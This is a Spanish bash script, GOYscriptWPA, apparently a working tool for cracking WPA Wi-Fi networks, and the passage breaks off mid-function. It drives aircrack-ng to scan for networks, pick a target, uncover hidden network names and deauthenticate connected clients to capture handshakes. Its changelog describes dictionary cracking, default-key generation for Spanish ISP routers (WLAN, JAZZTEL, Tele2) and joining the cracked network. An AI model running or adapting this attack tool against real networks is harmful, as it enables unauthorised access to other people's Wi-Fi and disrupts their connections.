#!/bin/bash
# LISTA DE CAMBIOS
# version 0.2
#	- version inicial (muy verde todavia)
#	- sólo se obtiene el handshake y se muestran las contraseñas por defecto
#	  de las redes WLAN_XXXX y JAZZTEL_XXXX
# version 1.0
#	- busca contraseñas con diccionarios genéricos cuando no se pueden usar personalizados
#	  para ello se deben guardar los diccionarios en la carpeta "dic" y con el formato generico.<nombre>.dic
#	- por hacer: si se trata de una red con contraseña por defecto conocida (WLAN o JAZZTEL), tras guardar
#		     la contraseña por defecto, debería capturar el handshake y confirmar que dicha
#		     contraseña es correcta.
# versión 1.1
#	- añadida la opción de conectarse a la red una vez descubierta la contraseña
# versión 1.2
#	- corregidos varios errores
#	- reorganizadas las columnas del listado de redes detectadas (para evitar que los nombres
#	  de red largos invadan la linea siguiente.
#	- ahora cuando se trata de una red con contraseña por defecto conocida, además de guardarla en un
#	  archivo, se procederá a capturar el handshake para confirmar si la contraseña es correcta.
#	- añadido el parámetro "-l" o "--lista" para omitir la búsqueda de redes y usar las
#	  encontradas en la búsqueda anterior. Si no existiera búsqueda anterior, se obvia.
#	- cambiada la carpeta de trabajo a "wpa" para evitar conflictos con goyscriptWEP
#	- cambiada la carpeta de contraseñas de "wifis" a "claves" (me parece un nombre más acertado)
#	- mejoras estéticas
# versión 1.3
# 	- integrado el programa "wpaclean" para limpiar las capturas del handshake, consiguiendo así que pese
# 	  menos de 1 KB.
#	- recompilada, traducida e integrada la suite aircrack al script (versión svn-2259)
# versión 1.4
#	- corregido bug "wicd"
#	- corregido bug con redes WLAN_XXXX (daba la contraseña por defecto como buena, en vez de capturar
#	  el handshake y confirmar si se había cambiado o no)
#	- implementada la búsqueda de contraseña en redes "Tele2" al vuelo (sin diccionario).
#	  Se usará el diccionario si éste se encuentra en la carpeta "dic"; si no es así, se usará el script
#	  que genera las contraseñas al vuelo y se las pasa a aircrack (es un pelín más lento, por eso tiene
#	  preferencia el diccionario)
# versión 1.5
#	- corregido bug "networkmanager" (por USUARIONUEVO)
# versión 1.6
#	- implementada compatibilidad con Backtrack (y quizá otras como Ubuntu)
#	- se mata NetworkManager antes de buscar redes (interfería con el proceso)
# versión 1.7
#	- corregido bug al conectarse a una red previamente desencriptada con goyscriptWPS
#	- ahora cuando se consigue la contraseña o se cancela el proceso, aparece el menú de selección de red
#	- recompilada, traducida e integrada la suite aircrack al script (versión svn-2275)
# versión 1.8
#	- corregido bug al conectarse a una red con contraseña de 64 caracteres
#	- corregido bug cuando no hay diccionario en la carpeta correspondiente
#	- corregido bug en la detección de la creación de diccionarios específicos
#	- corregido bug en Backtrack
# versión 1.9
#	- añadidos diccionarios genéricos por script (al vuelo)
# versión 2.0
#	- mejorada la compatibilidad entre distribuciones
# versión 2.1
#	- corregido bug al conectarse a una red. Ahora podemos desconectarnos de dicha red,
#	  matando wpa_supplicant, el cual mantenía fijado el canal.
#	- recompilada, traducida e integrada la suite aircrack al script (versión svn-2288)


##### CONSTANTES #####

negro="\033[0;30m"
rojo="\033[0;31m"
verde="\033[0;32m"
marron="\033[0;33m"
azul="\033[0;34m"
magenta="\033[0;35m"
cyan="\033[01;36m"
grisC="\033[0;37m"
gris="\033[1;30m"
rojoC="\033[1;31m"
verdeC="\033[1;32m"
amarillo="\033[1;33m"
azulC="\033[1;34m"
magentaC="\033[1;35m"
cyanC="\033[1;36m"
blanco="\033[1;37m"
subrayar="\E[4m"
parpadeoON="\E[5m"
parpadeoOFF="\E[0m"
resaltar="\E[7m"

NUM=1
CERO="0"
MAXIMO_PESO_DE_LA_CAPTURA=9900	# Aquí se fija el peso máximo en KB del archivo
				# de captura en el que se guardará el handshake
SEGUNDOS_ENTRE_EXPULSIONES=30	# Tiempo en segundos que dejaremos transcurrir antes de
				# expulsar de nuevo un cliente
HEAD="./software/./head"
TAIL="./software/./tail"
AIRCRACK="/usr/bin/aircrack-ng"
AIREPLAY="/usr/sbin/aireplay-ng -R --ignore-negative-one"
AIRMON="/usr/sbin/airmon-ng"
AIRODUMP="/usr/sbin/airodump-ng"
WPACLEAN="./software/wpaclean"
WLAN_JAZZTEL="./software/./wlan_xxxx"
ONO4XX="./software/./ono4xx"
WLAN4XX="./software/./wlan4xx"
STKEYS="./software/./stkeys"
MACS="./software/MACs.goy"
DICCIONARIO_AL_VUELO="./software/./diccionario_al_vuelo.sh"
WPA_PSK_RAW="./software/wpa_passphraseMOD" # modificación de wpa_passphrase para que no compruebe la longitud de la contraseña (y en español ;-D)

CAPTURA="wpa"
CLAVES="claves"
VERSION=$(grep "# versión" $0 | $TAIL -n 2 | $HEAD -n 1 | awk '{print $3}')

# LOS SIGUIENTES PARÁMETROS SE APLICAN POR DEFECTO CUANDO NO ES POSIBLE
# DETECTAR LA RESOLUCIÓN DE LA PANTALLA. ESTÁN OPTIMIZADOS PARA UNA
# RESOLUCIÓN DE 1024x768 PORQUE LA MAYORÍA DE LAS DISTRIBUCIONES DE
# LINUX ES LA QUE USAN POR DEFECTO
NORMAL="-fg black -bg white"
INFORMA="-fg black -bg yellow"
MAL="-fg black -bg red"
BIEN="-fg black -bg green"
FUENTE="-fs 8"
BUSCAR_REDES_VENTANA="-geometry 100x100-0+0"
AIRODUMP_VENTANA="-geometry 90x11-0-0"
CLIENTE_VENTANA="-geometry 90x2-0+0"
AIRCRACK_VENTANA="-geometry 70x23-0-0"

#CALCULAMOS LA RESOLUCION DE LA PANTALLA. DEPENDIENDO DE LA VERSION DE "xandr" SE RECORTA DE UNA FORMA U OTRA
which xdpyinfo > /dev/null 2>&1
if [ $? -eq 0 ]
then
	RESOLUCION=`xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3`
else
	which xrandr > /dev/null 2>&1
	if [ $? -eq 0 ]
	then
 		RESOLUCION=`xrandr | grep "*" | awk '{print $1}'`
 		RESOLUCION=`echo $RESOLUCION | grep "x"`
		if [ "$RESOLUCION" = "" ]
		then
			RESOLUCION=`xrandr | grep "current" | awk -F "current" '{print $2}' | awk -F " " '{print $1$2$3}' | awk -F "," '{print $1}'`
			RESOLUCION=`echo $RESOLUCION | grep "x"`
		fi
		if [ "$RESOLUCION" = "" ]
		then
			RESOLUCION=`xrandr | grep "*" | awk '{print $2$3$4}'`
			RESOLUCION=`echo $RESOLUCION | grep "x"`
		fi
	else
		which Xvesa > /dev/null 2>&1
		if [ $? -eq 0 ]
		then
			RESOLUCION=`Xvesa -listmodes 2>&1 | grep ^0x | awk '{ printf "%s %s\n",$2,$3 }' | sort -n | grep x[1-2][4-6] | $TAIL -n 1 | awk -F 'x' '{print $1"x"$2}'`
		else
			RESOLUCION=""
		fi
	fi
fi
case $RESOLUCION in
	1920x1080)
		FUENTE="-fn 9x15bold"
		BUSCAR_REDES_VENTANA="-geometry 105x100-0+0"
		AIRODUMP_VENTANA="-geometry 100x18-0-0"
		CLIENTE_VENTANA="-geometry 100x5-0+0"
		AIRCRACK_VENTANA="-geometry 80x25-0+0";;
	1280x1024)
		FUENTE="-fs 8"
		AIRODUMP_VENTANA="-geometry 100x31-0-0"
		CLIENTE_VENTANA="-geometry 100x3-0+0"
		AIRCRACK_VENTANA="-geometry 80x25-0-0";;
	1280x800)
		FUENTE="-fs 8"
		AIRODUMP_VENTANA="-geometry 100x14-0-0"
		CLIENTE_VENTANA="-geometry 100x3-0+0"
		AIRCRACK_VENTANA="-geometry 80x25-0-0";;
	1024x600)
		FUENTE="-fs 8"
		BUSCAR_REDES_VENTANA="-geometry 100x100-0+0"
		AIRODUMP_VENTANA="-geometry 90x11-0-0"
		CLIENTE_VENTANA="-geometry 90x2-0+0"
		AIRCRACK_VENTANA="-geometry 70x23-0-0";;
	"")
		RESOLUCION=""$rojoC"[no detectada]";;
esac

case $TERM in #EN DISTRIBUCIONES COMO BEINI, LOS PARAMETROS DE LA CONSOLA SON DISTINTOS
	rxvt)
		parpadeoON=""
		NORMAL="+sb -fg black -bg white +tr"
		INFORMA="+sb -fg black -bg yellow +tr"
		MAL="+sb -fg black -bg red +tr"
		BIEN="+sb -fg black -bg green +tr"
		FUENTE=""
		BUSCAR_REDES_VENTANA="-geometry 100x59-0+0"
		AIRODUMP_VENTANA="-geometry 100x18-0-0"
		CLIENTE_VENTANA="-geometry 100x2-0+0"
		AIRCRACK_VENTANA="-geometry 70x23-0-0";;
esac

INTERFAZ=0
INTERFAZ_MONITOR=0
$AIRMON stop mon0 > /dev/null 2>&1
TARJETAS_WIFI_DISPONIBLES=`iwconfig --version | grep "Recommend" | awk '{print $1}' | sort`
N_TARJETAS_WIFI=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print NF}'`

#############
# FUNCIONES #
#############

#HORA DE INICIO
function hora_inicio
{
ano1=`date +%Y`
mes1=`date +%m`
dia1=`date +%d`
hora1=`date +%H`
minutos1=`date +%M`
segundos1=`date +%S`
segundos_del_ano1=`date +%s`
}

#HORA DE FINALIZACIÓN
function hora_fin
{
ano2=`date +%Y`
mes2=`date +%m`
dia2=`date +%d`
hora2=`date +%H`
minutos2=`date +%M`
segundos2=`date +%S`
segundos_del_ano2=`date +%s`
}

#DIFERENCIA DE TIEMPO ENTRE "HORA DE INICIO" Y "HORA DE FINALIZACIÓN"
function calcular_tiempo
{
segundos=`expr $segundos_del_ano2 - $segundos_del_ano1`
minutos=0
horas=0
dias=0
dias=`expr $segundos / 86400`
segundos=`expr $segundos % 86400`
horas=`expr $segundos / 3600`
segundos=`expr $segundos % 3600`
minutos=`expr $segundos / 60`
segundos=`expr $segundos % 60`
}

function mostrar_duracion
{
echo -e $cyanC"Duración del proceso...: "$blanco"\c"
if [ $dias -ne 0 ]	# DESGLOSE EN DIAS, HORAS, MINUTOS Y SEGUNDOS DE LA DURACIÓN DEL PROCESO
then
	if [ $dias -eq 1 ]
	then
		echo -e "$dias día\c"
	else
		echo -e "$dias días\c"
	fi
	if [ $horas -ne 0 ] && [ $minutos -eq 0 ] && [ $segundos -eq 0 ]
	then
		echo -e " y \c"
	else
		if [ $horas -eq 0 ] && [ $minutos -ne 0 ] && [ $segundos -eq 0 ]
		then
			echo -e " y \c"
		else
			if [ $horas -eq 0 ] && [ $minutos -eq 0 ] && [ $segundos -ne 0 ]
			then
				echo -e " y \c"
			else
				if [ $horas -ne 0 ] || [ $minutos -ne 0 ] || [ $segundos -ne 0 ]
				then
					echo -e ", \c"
				fi
			fi
		fi
	fi
fi
if [ $horas -ne 0 ]
then
	if [ $horas -eq 1 ]
	then
		echo -e "$horas hora\c"
	else
		echo -e "$horas horas\c"
	fi
	if [ $minutos -ne 0 ] && [ $segundos -eq 0 ]
	then
		echo -e " y \c"
	fi
	if [ $minutos -eq 0 ] && [ $segundos -ne 0 ]
	then
		echo -e " y \c"
	fi
	if [ $minutos -ne 0 ] && [ $segundos -ne 0 ]
	then
		echo -e ", \c"
	fi
fi
if [ $minutos -ne 0 ]
then
	if [ $minutos -eq 1 ]
	then
		echo -e "$minutos minuto\c"
	else
		echo -e "$minutos minutos\c"
	fi
	if [ $segundos -ne 0 ]
	then
		echo -e " y \c"
	fi
fi
if [ $segundos -ne 0 ]
then
	if [ $segundos -eq 1 ]
	then
		echo -e "$segundos segundo\c"
	else
		echo -e "$segundos segundos\c"
	fi
else
	echo -e "$segundos segundos\c"
fi
echo -e "$grisC"
echo
}

#COMPRUEBA SI HAY INTERFACES EN MODO MONITOR Y, SI LAS HAY, LAS DESACTIVA
function desactivar_todos_monX
{
INTERFACES_MONITOR=`iwconfig --version | grep "Recommend" | awk '{print $1}' | grep mon`
let CUANTAS=`echo $INTERFACES_MONITOR | wc -w`
let CONT=1
while [ $CONT -le $CUANTAS ]
do
	MON=`echo $INTERFACES_MONITOR | awk '{print $'$CONT'}'`
	$AIRMON stop $MON > /dev/null 2>&1
	let CONT=$CONT+1
done
}

#DETIENE POSIBLES PROCESOS EN MARCHA
function matar_procesos
{
echo -e "$cyan""\n$1"
echo -e "$grisC"
PROCESOS=`ps -A | grep -e xterm -e ifconfig -e dhcpcd -e dhclient -e NetworkManager -e wpa_supplicant -e udhcpc`
while [ "$PROCESOS" != "" ]
do
	killall -q xterm ifconfig dhcpcd dhclient dhclient3 NetworkManager wpa_supplicant udhcpc > /dev/null 2>&1
	PROCESOS=`ps -A | grep -e xterm -e ifconfig -e dhcpcd -e dhclient -e NetworkManager -e wpa_supplicant -e udhcpc`
done
desactivar_todos_monX
}

#BORRA ARCHIVOS DE SESIONES ANTERIORES
function borrar_sesiones_anteriores
{
if [ -d "./$CAPTURA" ]
then
	echo -e ""$cyan"Borrando archivos temporales de sesiones anteriores..."$grisC""
	echo
	mv $CAPTURA/wifis.csv $CAPTURA/anteriorCSV.wifis > /dev/null 2>&1
	mv $CAPTURA/clientes_wpa.csv $CAPTURA/anteriorCSV.wifis-wpa-clientes > /dev/null 2>&1
	rm -rf $CAPTURA/red_oculta*  > /dev/null 2>&1
	rm -rf $CAPTURA/ataque4.cap > /dev/null 2>&1
	rm -rf $CAPTURA/ataque5.cap > /dev/null 2>&1
	rm -rf $CAPTURA/wifis* > /dev/null 2>&1
	rm -rf $CAPTURA/*.kismet.csv > /dev/null 2>&1
	rm -rf $CAPTURA/*.kismet.netxml > /dev/null 2>&1
	rm -rf $CAPTURA/*.csv > /dev/null 2>&1
	rm -rf $CAPTURA/diccionario* > /dev/null 2>&1
fi
mkdir $CAPTURA > /dev/null 2>&1
mkdir handshakes > /dev/null 2>&1
mkdir dic > /dev/null 2>&1
mkdir -p "$CLAVES"  > /dev/null 2>&1
rm -rf *.cap > /dev/null 2>&1
rm -rf *.xor > /dev/null 2>&1
}

#NOMBRE Y VERSIÓN DEL SCRIPT
function version
{
clear
echo -e "$blanco\c"
echo -e "+====================================+"
echo -e "|    GOYscriptWPA $VERSION by GOYfilms    |"
echo -e "+====================================+"
echo -e $grisC
}

#SELECCIÓN DE LA TARJETA WiFi
function seleccionar_tarjeta
{
if [ "$TARJETAS_WIFI_DISPONIBLES" = "" ]
then
	echo -e ""$rojoC"ERROR: No se detectó ninguna tarjeta WiFi"
	echo -e "$grisC"
	pulsar_una_tecla "Pulsa una tecla para salir..."
else
	echo -e ""$cyan"Tarjetas WiFi disponibles:"$grisC""
	echo
	x=1
	while [ $x -le $N_TARJETAS_WIFI ]
	do
		INTERFAZ=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $'$x'}'`
		DRIVER=`ls -l /sys/class/net/$INTERFAZ/device/driver | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/'`
		MAC=`ifconfig $INTERFAZ | grep "$INTERFAZ" | $TAIL --bytes 20 | $HEAD --bytes 8 | awk '{print toupper($0)}'` #extraemos la MAC XX:XX:XX (sólo los 3 primeros pares)
		if [ "$MAC" = "00-00-00" ] #SI LA INTERFAZ ESTÁ EN MODO MONITOR VARÍA EL MÉTODO PARA EXTRAER LA MAC
		then
			MAC=`ifconfig $INTERFAZ | grep "$INTERFAZ" | awk '{print $5}' | $HEAD --bytes 8 | awk '{gsub(/-/,":"); print}' | awk '{print toupper($0)}'` #extraemos la MAC
		fi
		FABRICANTE_INTERFAZ=`grep $MAC $MACS | awk -F '#' '{print $2}'`
		if [ "$FABRICANTE_INTERFAZ" = "" ]
		then
			FABRICANTE_INTERFAZ="<Desconocido>"
		fi
		if [ $x -eq 1 ]
		then
			echo -e ""$cyan" Nº\tINTERFAZ\tDRIVER\t\tFABRICANTE"
			echo -e ""$cyan" ==\t========\t======\t\t=========="
		fi
		CARACTERES_DRIVER=`echo $DRIVER | wc -c` 
		if [ $CARACTERES_DRIVER -gt 8 ] #CONTROLA LA TABULACIÓN DEPENDIENDO DE LOS CARACTERES QUE TENGA LA VARIABLE "DRIVER"
		then
			TAB=""
		else
			TAB="\t"
		fi
		echo -e ""$amarillo" $x)\t$INTERFAZ \t\t$DRIVER\t"$TAB"$FABRICANTE_INTERFAZ"
		x=$((x+1))
	done
	if [ $N_TARJETAS_WIFI -gt 1 ] # SI DETECTA MAS DE UNA NOS PREGUNTA CUAL QUEREMOS
	then
		echo -e "\n"$cyan"\nSelecciona una tarjeta WiFi:\c"
		echo -e ""$amarillo" \c"
		read -n 1 OPCION
		while [[ $OPCION < 1 ]] || [[ $OPCION > $N_TARJETAS_WIFI ]]
		do
			echo -en "\a\033[10C"$rojoC"OPCIÓN NO VÁLIDA"$grisC""
			echo -en ""$cyan"\rSelecciona una tarjeta WiFi: "$amarillo"\c"
			read -n 1 OPCION
		done
	else
		OPCION=1
	fi
	echo -en "\a\033[10C                "$grisC"" #BORRA EL MENSAJE DE "OPCIÓN NO VÁLIDA"
fi
if [ $N_TARJETAS_WIFI -gt 1 ] # SI DETECTA MÁS DE UNA VARÍA EL MENSAJE
then
	INTERFAZ=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $'$OPCION'}'`
	echo -e "\n"
	echo -e ""$cyan"Has seleccionado: "$verdeC"$INTERFAZ"$grisC""
	echo
else
	echo
	echo -e ""$cyan"Sólo se ha detectado una tarjeta WiFi: "$verdeC"$INTERFAZ"$grisC""
	echo
fi
}

#MUESTRA LA RESOLUCIÓN DE PANTALLA ACTUAL
function mostrar_resolucion_de_pantalla
{
echo -e ""$cyan"Resolución de pantalla actual: "$verdeC"$RESOLUCION"$grisC""
echo
}

#INICIALIZACIÓN DE LA TARJETA
function iniciar_tarjeta
{
echo -e ""$cyan"Iniciando la tarjeta WiFi..."$grisC""
echo
ifconfig $INTERFAZ down
MAC_INTERFAZ=`ifconfig $INTERFAZ | grep "$INTERFAZ" | $TAIL --bytes 20 | $HEAD --bytes 17 | awk '{print toupper($0)}'` #extraemos la MAC de la interfaz del comando 'ifconfig'
if [ "$MAC_INTERFAZ" = "00-00-00-00-00-00" ] #SI LA INTERFAZ ESTÁ EN MODO MONITOR VARÓA EL MÉTODO PARA EXTRAER LA MAC
then
	MAC_INTERFAZ=`ifconfig $INTERFAZ | grep "$INTERFAZ" | awk '{print $5}' | $HEAD --bytes 17  | awk '{gsub(/-/,":"); print}' | awk '{print toupper($0)}'` #extraemos la MAC
fi
ifconfig $INTERFAZ up
iwconfig $INTERFAZ rate 1M
}

#ACTIVA EL MODO MONITOR DE LA INTERFAZ
function activar_modo_monitor
{
echo -e ""$cyan"Activando modo monitor en $INTERFAZ [MAC="$MAC_INTERFAZ"]..."$grisC""
$AIRMON start $INTERFAZ $CANAL
ifconfig mon0 > /dev/null 2>&1
if [ $? = 0 ] #SI LA ORDEN ANTERIOR SE COMPLETÓ CORRECTAMENTE, SIGNIFICA QUE EXISTE LA INTERFAZ "mon0"
then
	INTERFAZ_MONITOR=mon0
else
	INTERFAZ_MONITOR=$INTERFAZ
fi
}

#BÚSQUEDA DE REDES WPA
function buscar_redes
{
if [ -x "/etc/rc.d/rc.wicd" ]; then
   killwicd > /dev/null 2>&1
else	
   /etc/rc.d/rc.networkmanager stop > /dev/null 2>&1
fi
echo -e "$cyan"
echo -e "$parpadeoON+================================+"
echo -e "|                                |"
echo -e "|$parpadeoOFF "$cyan" PULSA CONTROL+C PARA DETENER  $parpadeoON|"
echo -e "|$parpadeoOFF "$cyan" LA  BÚSQUEDA  Y  SELECCIONAR  $parpadeoON|"
echo -e "|$parpadeoOFF "$cyan" UNA DE LAS REDES DETECTADAS   $parpadeoON|"
echo -e "|                                |"
echo -e "+================================+"
echo -e "$parpadeoOFF""$grisC"
xterm $NORMAL $FUENTE $BUSCAR_REDES_VENTANA -title "BUSCANDO REDES WiFi" -e $AIRODUMP --encrypt WPA -w ./$CAPTURA/wifis $INTERFAZ_MONITOR
LINEAS_AP=`cat $CAPTURA/wifis-01.csv | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'` #Nº LINEAS HASTA "Station" o "Cliente" (si se usa el airodump-ng traducido) :D
LINEAS_AP=`expr $LINEAS_AP - 1` #RESTAMOS 1 PARA ELIMINAR TAMBIÉN LA LINEA "Station"
$HEAD -n $LINEAS_AP $CAPTURA/wifis-01.csv &> $CAPTURA/wifis.csv #GUARDAMOS EN UN ARCHIVO LOS APs
$TAIL -n +$LINEAS_AP $CAPTURA/wifis-01.csv &> $CAPTURA/clientes_wpa.csv #GUARDAMOS EN OTRO LOS CLIENTES
clear
LINEAS_WIFIS_CSV=`wc -l $CAPTURA/wifis.csv | awk '{print $1}'`
if [ $LINEAS_WIFIS_CSV -le 3 ] 	#SI EL ARCHIVO "wifis.csv" TIENE 3 LINEAS
then				#ES QUE NO SE DETECTÓ NINGUNA RED
	echo -e "$rojoC"
	echo -e "No se encontró ninguna red WiFi con contraseña WPA."
	echo -e "$grisC"
	pulsar_una_tecla "Pulsa una tecla para salir..."
fi
rm -rf $CAPTURA/wifis.goy > /dev/null 2>&1
i=0
while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY
do
	caracteres_mac=${#MAC}
	if [ $caracteres_mac -ge 17 ]
	then
		i=$(($i+1))
		if [[ $POWER -lt 0 ]]
		then
			if [[ $POWER -eq -1 ]]
			then
				POWER=0
			else
				POWER=`expr $POWER + 100`
			fi
		fi
		POWER=`echo $POWER | awk '{gsub(/ /,""); print}'` #ELIMINA LOS ESPACIOS SI LOS HAY
		IV=`echo $IV | awk '{gsub(/ /,""); print}'` #CORRIGE LOS IVs RECORTANDO LOS ESPACIOS
		ESSID=`expr substr "$ESSID" 2 $IDLENGTH` #CORRIGE EL NOMBRE DE LA RED WiFi RECORTANDO EL ESPACIO DEL PRINCIPIO
		if [ $CHANNEL -gt 13 ] || [ $CHANNEL -lt 1 ] #SI EL CANAL NO ESTÁ ENTRE 1 Y 13 ENTONCES NO ES VÁLIDO
		then
			CHANNEL=0
		else
			CHANNEL=`echo $CHANNEL | awk '{gsub(/ /,""); print}'` #CORRIGE EL CANAL ELIMINANDO LOS ESPACIOS
		fi
		if [ "$ESSID" = "" ] || [ "$CHANNEL" = "-1" ] #SI EL NOMBRE DE LA RED ESTÁ VACÍO ES QUE ES UNA RED OCULTA
		then
			ESSID="< Oculta >"
		fi
		echo -e "$MAC,$CHANNEL,$IV,$POWER,$ESSID" >> $CAPTURA/wifis.goy
	fi
done < $CAPTURA/wifis.csv
sort -t "," -d -k 4 "$CAPTURA/wifis.goy" > "$CAPTURA/redes_wpa.goy"
}

#SELECCIÓN DE LA RED A ATACAR
function seleccionar_red
{
clear
echo -e ""$cyan"\c"
echo "          Redes WiFi detectadas con contraseña WPA        "
echo "          ========================================        "
echo
echo "  Nº          MAC         CANAL  IVs  SEÑAL  NOMBRE DE RED"
echo "  ==   =================  =====  ===  =====  ============="
i=0
while IFS=, read MAC CANAL IV POTENCIA ESSID
do
	i=$(($i+1))
	if [ $i -le 9 ] #ALINEA A LA DERECHA EL NUMERO DE OPCIÓN
	then
		ESPACIO1=" "
	else
		ESPACIO1=""
	fi
	if [[ $CANAL -le 9 ]] #ALINEA A LA DERECHA EL CANAL
	then
		ESPACIO2=" "
		if [[ $CANAL -eq 0 ]]
		then
			CANAL="-"
		fi
	else
		ESPACIO2=""
	fi
	if [[ $IV -le 9 ]] #ALINEA A LA DERECHA LOS IVs
	then
		ESPACIO3=" "
	else
		ESPACIO3=""
	fi
	if [[ "$POTENCIA" = "" ]]
	then
		POTENCIA=0
	fi
	if [[ $POTENCIA -le 9 ]] #ALINEA A LA DERECHA LA POTENCIA DE LA SEÑAL
	then
		ESPACIO4=" "
	else
		ESPACIO4=""
	fi
	if [[ $IV -eq 0 ]] #SI NO SE HAN CAPTURADO IVs LO CAMBIAMOS POR "-". ME GUSTA MÁS PORQUE DESTACA MENOS QUE UN "0"
	then
		IV="-"
	else
		if [[ $IV -gt 99 ]]
		then
			let IV=99 #PARA QUE NO SE DESCUADREN LAS COLUMNAS
		fi
	fi
	MAC_GUIONES=`echo $MAC | awk '{gsub(/:/,"-"); print}'`
	EXISTE_CLAVE=`find "$CLAVES" | grep "$ESSID ($MAC_GUIONES).txt"`
	EXISTE_HANDSHAKE=`find handshakes | grep "$ESSID ($MAC_GUIONES).cap"`
	if [ ! "$EXISTE_CLAVE" = "" ] #CAMBIAMOS EL COLOR DEPENDIENDO DE SI YA TENEMOS LA CLAVE Y OTROS FACTORES
	then
		echo -e "$magenta\c"
	else
		if [ ! "$EXISTE_HANDSHAKE" = "" ] #SINÓ CAMBIAMOS EL COLOR SI YA TENEMOS EL HANDSHAKE: MARRÓN
		then
			echo -e "$marron\c"
		else
			if [ "$ESSID" = "< Oculta >" ] #SI LA RED ESTÁ OCULTA LA MARCAMOS DE COLOR ROJO
			then
				echo -e "$rojoC\c"
			else
				echo -e "$blanco\c" #SI NO REUNE NINGUNA DE LAS CARACTERÍSTICAS ANTERIORES, LA LINEA SERÁ BLANCA
			fi
		fi
	fi
	CLIENTE=`cat $CAPTURA/clientes_wpa.csv | grep $MAC`
	if [ "$CLIENTE" != "" ]
	then
		CLIENTE="#" #MUESTRA UNA ALMOHADILLA EN LAS REDES QUE TIENEN CLIENTES CONECTADOS
		ESPACIO5=""
	else
		ESPACIO5=" "
	fi
	nombres_ap[$i]=$ESSID
	canales[$i]=$CANAL
	macs[$i]=$MAC
	echo -e " $ESPACIO1$i)$CLIENTE  $ESPACIO5$MAC   $ESPACIO2$CANAL    $ESPACIO3$IV    $ESPACIO4$POTENCIA%   $ESSID"
done < "$CAPTURA/redes_wpa.goy"
echo
if [ $i -eq 1 ] #SI SÓLO SE HA DETECTADO UNA RED YA NO NOS DÁ A ESCOGER ;-D
then
	SELECCION=1
else
	echo -e ""$cyan"\rSelecciona una red de la lista: "$amarillo"\c"
	read SELECCION
fi
while [[ $SELECCION -lt 1 ]] || [[ $SELECCION -gt $i ]]
do
	echo -en "\a\033[1A\033[40C"$rojoC"OPCIÓN NO VÁLIDA"$grisC""
	echo -en "\a\r"$cyan"Selecciona una red de la lista: "$amarillo"\c"
	read SELECCION
done
NOMBRE_AP=${nombres_ap[$SELECCION]}
CANAL=${canales[$SELECCION]}
MAC_AP=${macs[$SELECCION]}
echo -e "\a\033[1A\033[40C                "$grisC"" #BORRA EL MENSAJE DE "OPCIÓN NO VÁLIDA"
MAC_GUIONES=`echo $MAC_AP | awk '{gsub(/:/,"-"); print}'`
if [ "$NOMBRE_AP" = "< Oculta >" ]
then
	echo -e $rojoC
	echo -e "Has seleccionado una red oculta."
	echo -e "Hay que averiguar algunos datos antes de poder continuar."
	echo -e $grisC
	descubrir_red_oculta
fi
}

#DESCUBRE LOS DATOS QUE FALTAN DE UNA RED OCULTA
function descubrir_red_oculta
{
if [ "$CANAL" = "-" ] || [ $CANAL -lt 1 ] || [ $CANAL -gt 13 ] #SI EL CANAL NO ES VÁLIDO, SE BUSCA EL CANAL CORRECTO.
then
	echo -e $cyan"   Buscando CANAL... "$grisC" \c"
	xterm $NORMAL $FUENTE $AIRODUMP_VENTANA -title "Buscando el canal de $MAC_AP" -e $AIRODUMP --bssid $MAC_AP -w "$CAPTURA/red_oculta_canal" $INTERFAZ_MONITOR &
	CANAL=""
	while [[ "$CANAL" = "" ]] || [[ $CANAL -gt 13 ]] || [[ $CANAL -lt 1 ]]
	do
		if [ -e "$CAPTURA/red_oculta_canal-01.csv" ]
		then
			CANAL=`cat $CAPTURA/red_oculta_canal-01.csv | $HEAD -n 3 | $TAIL -n 1 | awk -F ',' '{print $4}' | awk '{gsub(/ /,""); print}'`
		fi
	done
	echo -e $verdeC"Encontrado: $CANAL"
	echo -e $grisC
	killall airodump-ng > /dev/null 2>&1
fi
echo -e $cyan"   Buscando NOMBRE DE RED... "$grisC" \c"
xterm $NORMAL $FUENTE $AIRODUMP_VENTANA -title "Buscando el nombre de red de $MAC_AP" -e $AIRODUMP --bssid $MAC_AP -c $CANAL,$CANAL -w "$CAPTURA/red_oculta_nombre" $INTERFAZ_MONITOR &
NOMBRE_AP=""
CLIENTE=""
while [ "$NOMBRE_AP" = "" ] #BUSCAMOS EL NOMBRE DE LA RED
do
	if [ -e "$CAPTURA/red_oculta_nombre-01.csv" ]
	then
		NOMBRE_AP=`cat $CAPTURA/red_oculta_nombre-01.csv | $HEAD -n 3 | $TAIL -n 1 | awk -F ',' '{print $14}' | sed "s/^.\(.*\)/\1/"`
		CLIENTE=`cat $CAPTURA/red_oculta_nombre-01.csv | $TAIL -n 2 | $HEAD -n 1 | awk -F ',' '{print $1}'`
	fi
	if [ "$CLIENTE" != "" ] #SI HAY UN CLIENTE CONECTADO LO EXPULSAMOS PARA CONSEGUIR EL NOMBRE AL RECONECTARSE
	then
		xterm $BIEN $FUENTE $CLIENTE_VENTANA -title "ATAQUE -0 [Expulsando al cliente del AP]" -e $AIREPLAY -0 20 -a $MAC_AP -c $CLIENTE $INTERFAZ_MONITOR
		CLIENTE=""
	fi
	sleep 5
done
echo -e $verdeC"Encontrado: \"$NOMBRE_AP\""
echo -e $grisC
killall airodump-ng > /dev/null 2>&1
}

#MUESTRA LOS DATOS CON LOS QUE SE VA A TRABAJAR
function mostrar_datos_seleccionados
{
if [ "$FABRICANTE_INTERFAZ" = "" ]
then
	MAC_INTERFAZ_MITAD=`echo $MAC_INTERFAZ | $HEAD --bytes 8`
	FABRICANTE_INTERFAZ=`grep $MAC_INTERFAZ_MITAD $MACS | awk -F '#' '{print $2}'`
fi
MAC_AP_MITAD=`echo $MAC_AP | $HEAD --bytes 8` #recortamos la MAC XX:XX:XX
FABRICANTE_AP=`grep $MAC_AP_MITAD $MACS | awk -F '#' '{print $2}'` #buscamos el fabricante en la base de datos
if [ "$FABRICANTE_AP" = "" ]
then
	FABRICANTE_AP="<Desconocido>"
fi
echo -e "$amarillo"
echo "R E S U M E N"
echo "============="
echo
echo -e "  "$subrayar"INTERFAZ"$parpadeoOFF""$amarillo":"
echo "    Nombre..........: $INTERFAZ"
